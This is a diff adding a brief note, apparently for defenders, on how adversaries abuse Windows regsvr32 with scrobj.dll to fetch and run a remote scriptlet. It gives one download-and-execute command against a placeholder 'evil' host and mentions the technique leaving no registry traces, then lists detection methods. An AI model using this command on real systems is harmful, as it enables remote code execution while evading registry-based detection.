@@ -1,0 +1,18 @@
+In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems 
+for registering and unregistering DLLs and ActiveX controls in the Windows Registry.Adversaries can still use Regsvr32.exe on Windows
+to download and execute files
+
+Usage:
+regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
+
+regsvr32 is invoking scrobj.dll to unregister COM objescts defined in the evil.sct. Malicious code will be used in the sct file.
+The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.
+It doesn’t have to be .sct. There wiil be no artifacts left in registry if this utility is unregistering any COM object.
+
+
+Detection:
+1.Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
+2.Command execution and arguments passed to regsvr32.exe using EDR solutions.
+3.Look for the HTTP useragents with regsvr32 in the network recorders or the proxy logs.
+4.Look for suspicious process in the system with parent process as regsvr32.
+
